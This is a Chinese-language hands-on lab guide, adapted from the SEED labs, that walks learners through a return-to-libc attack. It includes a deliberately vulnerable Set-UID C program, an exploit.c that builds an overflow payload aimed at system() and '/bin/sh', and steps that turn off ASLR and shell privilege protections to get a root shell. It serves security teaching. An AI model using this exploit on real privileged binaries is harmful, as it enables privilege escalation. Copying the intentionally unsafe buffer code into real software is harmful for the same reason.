---
show: step
version: 0.1
enable_checker: true
---

#Return-to-libc 攻击实验


##一、实验描述

在进行本次实验之前，建议先做 [缓冲区溢出漏洞实验](http://www.shiyanlou.com/courses/231) 。

缓冲区溢出的常用攻击方法是用 `shellcode` 的地址来覆盖漏洞程序的返回地址，使得漏洞程序去执行存放在栈中 `shellcode`。为了阻止这种类型的攻击，一些操作系统使得系统管理员具有使栈不可执行的能力。这样的话，一旦程序执行存放在栈中的 `shellcode` 就会崩溃，从而阻止了攻击。

不幸的是上面的保护方式并不是完全有效的，现在存在一种**缓冲区溢出的变体攻击**，叫做 `return-to-libc` 攻击。这种攻击不需要一个栈可以执行，甚至不需要一个 `shellcode`。取而代之的是我们让漏洞程序跳转到现存的代码（比如已经载入内存的 `libc` 库中的 `system（）`函数等）来实现我们的攻击。

##二、实验准备

系统用户名： shiyanlou

实验楼提供的是 64 位 Ubuntu linux，而本次实验为了方便观察汇编语句，我们需要在 32 位环境下作操作，因此实验之前需要做一些准备。

####2.1 输入命令安装一些用于编译 32 位 C 程序的软件包

```
sudo apt-get update

sudo apt-get install lib32z1 libc6-dev-i386 #这个过程耗时有点长，请等待一会

sudo apt-get install lib32readline-gplv2-dev
```

```checker
- name: check package
  script: |
    #!/bin/bash
    apt-cache pkgnames|grep -E "lib32z1|libc6-dev-i386|lib32readline-gplv2-dev"
  error: 没有安装需要的安装包
  timeout: 30
```

####2.2 输入命令 `linux32` 进入 32 位 linux 环境，输入 `/bin/bash` 使用 bash：

![2.2-1](https://doc.shiyanlou.com/document-uid8797labid754timestamp1526547396865.png/wm)

##三、实验步骤
本节将通过实践操作，带领大家了解 Return-to-libc 攻击。

###3.1 初始设置

Ubuntu 和其他一些 Linux 系统中，使用地址空间随机化来随机堆（heap）和栈（stack）的初始地址，这使得猜测准确的内存地址变得十分困难，而猜测内存地址是缓冲区溢出攻击的关键。因此本次实验中，我们使用以下命令关闭这一功能：

```
sudo sysctl -w kernel.randomize_va_space=0
```

此外，为了进一步防范缓冲区溢出攻击及其它利用 shell 程序的攻击，许多 shell 程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个 Set-UID 程序调用一个 shell，也不能在这个 shell 中保持 root 权限，这个防护措施在`/bin/bash` 中实现。

linux 系统中，`/bin/sh` 实际是指向`/bin/bash` 或 `/bin/dash` 的一个符号链接。为了重现这一防护措施被实现之前的情形，我们使用另一个 shell 程序（zsh）代替 `/bin/bash`。下面的指令描述了如何设置 zsh 程序：

```
sudo su

cd /bin

rm sh

ln -s zsh sh

exit
```

为了防止缓冲区溢出攻击，最近版本的 gcc 编译器默认将程序编译设置为**栈不可执行**，而你可以在编译的时候手动设置是否使栈不可执行：

```
gcc -z execstack -o test test.c    #栈可执行

gcc -z noexecstack -o test test.c  #栈不可执行
```

> 本次实验的目的，就是展示这个“栈不可执行”的保护措施并不是完全有效，所以我们使用`-z noexecstack`，或者不手动指定而使用编译器的默认设置。

```checker
- name: check random
  script: |
    #!/bin/bash
    sysctl -a|grep randomize_va_space|grep 0
  error: 没有关闭地址空间随机化功能
- name: check link
  script: |
    #!/bin/bash
    ls -l /bin/sh|grep zsh
  error: 没有链接 sh 到 zsh
```

###3.2 漏洞程序

在 `/home/shiyanlou` 目录下新建 `retlib.c` 文件

```
cd /home/shiyanlou
vi retlib.c
```

代码如下：

```c
/* retlib.c */
/* This program has a buffer overflow vulnerability. */
/* Our task is to exploit this vulnerability */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int bof(FILE *badfile)
{
    char buffer[12];
    /* The following statement has a buffer overflow problem */
    fread(buffer, sizeof(char), 40, badfile);
    return 1;
}
int main(int argc, char **argv)
{
    FILE *badfile;
    badfile = fopen("badfile", "r");
    bof(badfile);
    printf("Returned Properly\n");
    fclose(badfile);
    return 1;
}
```

> 按 `i` 键插入，按 `esc` ，再输入 `:wq` 可保存退出。

编译该程序，并设置 SET-UID。命令如下：

```
sudo su

gcc -m32 -g -z noexecstack -fno-stack-protector -o retlib retlib.c

chmod u+s retlib

exit
```

或者也可以 `gcc -m32 -g -fno-stack-protector -o retlib retlib.c`，默认使用“栈不可执行”保护。

GCC 编译器有一种栈保护机制来阻止缓冲区溢出，所以我们在编译代码时需要用 –fno-stack-protector 关闭这种机制。

上述程序有一个缓冲区溢出漏洞，它先从一个叫 `badfile` 的文件里把 40 字节的数据读取到 12 字节的 `buffer`，引起溢出。`fread()` 函数不检查边界所以会发生溢出。由于此程序为 SET-ROOT-UID 程序，如果一个普通用户利用了此缓冲区溢出漏洞，他有可能获得 `root shell`。应该注意到此程序是从一个叫做`badﬁle`的文件获得输入的，这个文件受用户控制。现在我们的目标是为 `badﬁle` 创建内容，这样当这段漏洞程序将此内容复制进它的缓冲区，便产生了一个 root shell 。

我们还需要用到一个读取环境变量的程序，在 `/home/shiyanlou` 目录下新建 `getenvaddr.c` 文件，文件内容如下：

```c
/* getenvaddr.c */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char const *argv[])
{
    char *ptr;

    if (argc < 3)
    {
        printf("Usage: %s <environment var> <target program name>\n", argv[0]);
        exit(0);
    }
    ptr = getenv(argv[1]);
    ptr += (strlen(argv[0]) - strlen(argv[2])) * 2;
    printf("%s will be at %p\n", argv[1], ptr);
    return 0;
}
```

编译一下：

```
gcc -m32 -o getenvaddr getenvaddr.c
```

```checker
- name: check retlib.c
  script: |
    #!/bin/bash
    ls /home/shiyanlou/retlib.c
  error: /home/shiyanlou 目录下没有 retlib.c 文件
- name: check retlib
  script: |
    #!/bin/bash
    stat -c %a /home/shiyanlou/retlib|grep 4755
    stat -c %U /home/shiyanlou/retlib|grep root
  error: relib 权限和所有者不对
- name: check getenvaddr.c
  script: |
    #!/bin/bash
    ls /home/shiyanlou/getenvaddr.c
  error: /home/shiyanlou 目录下没有 getenvaddr.c 文件
- name: check getenvaddr.c
  script: |
    #!/bin/bash
    ls /home/shiyanlou/getenvaddr
  error: 没有编译 getenvaddr.c
```

###3.3 攻击程序

在 `/home/shiyanlou` 目录下新建 `exploit.c` 文件，内容如下：

```c
/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
int main(int argc, char **argv)
{
 char buf[40];
 FILE *badfile;
 badfile = fopen(".//badfile", "w");
 
 strcpy(buf, "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90");// nop 24 times
  
 *(long *) &buf[32] =0x11111111; // "//bin//sh"
 *(long *) &buf[24] =0x22222222; // system()
 *(long *) &buf[36] =0x33333333; // exit()
 fwrite(buf, sizeof(buf), 1, badfile);
 fclose(badfile);
}
```

代码中“0x11111111”、“0x22222222”、“0x33333333”分别是 BIN_SH、system、exit 的地址，需要我们接下来获取。

```checker
- name: check exploit.c
  script: |
    #!/bin/bash
    ls /home/shiyanlou/exploit.c
  error: /home/shiyanlou/ 目录下没有 exploit.c 文件
```

###3.4 获取内存地址

####1、用刚才的 getenvaddr 程序获得 BIN_SH 地址：

![3.4-1](https://doc.shiyanlou.com/document-uid8797labid754timestamp1526547920065.png)

####2、gdb 获得 system 和 exit 地址：

![3.4-2](https://doc.shiyanlou.com/document-uid8797labid754timestamp1526548112491.png/wm)

>  退出gdb调试：按 `q` 再按 `enter` ，再输入 `y` 。
>
>  实际操作中得到的地址和我的不同，需要改成你自己实际得到的地址。

修改 `exploit.c` 文件，填上刚才找到的内存地址：

![3.4-3](https://doc.shiyanlou.com/document-uid8797labid754timestamp1526548175344.png)

删除刚才调试编译的 exploit 程序和 badfile 文件，重新编译修改后的 exploit.c：

```
rm exploit
rm badfile
gcc -m32 -o exploit exploit.c
```

```checker
- name: check exploit
  script: |
    #!/bin/bash
    ls /home/shiyanlou/exploit
  error: 没有编译 exploit.c
```

###3.5 攻击

先运行攻击程序 exploit，再运行漏洞程序 retlib，可见攻击成功，获得了 root 权限：

![3.4-4](https://doc.shiyanlou.com/document-uid8797labid754timestamp1526548397230.png/wm)


##四、练习

**1、按照实验步骤进行操作，攻击漏洞程序并获得 root 权限。** 

**2、将`/bin/sh` 重新指向`/bin/bash`（或`/bin/dash`），观察能否攻击成功，能否获得 root 权限。** 

**3、观察、思考本次实验和[缓冲区溢出漏洞实验](http://www.shiyanlou.com/courses/231)的相同和不同之处。** 

以上练习请在实验楼环境完成并截图。


## 版权声明

本课程所涉及的实验来自[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)，并在此基础上为适配[实验楼](http://www.shiyanlou.com)网站环境进行修改，修改后的实验文档仍然遵循 GNU Free Documentation License。

本课程文档 github 链接：[https://github.com/shiyanlou/seedlab](https://github.com/shiyanlou/seedlab)

附[Syracuse SEED labs](http://www.cis.syr.edu/~wedu/seed/)版权声明：

> Copyright Statement Copyright 2006 – 2014 Wenliang Du, Syracuse University. The development of this document is funded by the National Science Foundation’s Course, Curriculum, and Laboratory Improvement (CCLI) program under Award No. 0618680 and 0231122. Permission is granted to copy, distribute and/or modify this document under the terms of the GNU Free Documentation License, Version 1.2 or any later version published by the Free Software Foundation. A copy of the license can befound at http://www.gnu.org/licenses/fdl.html.
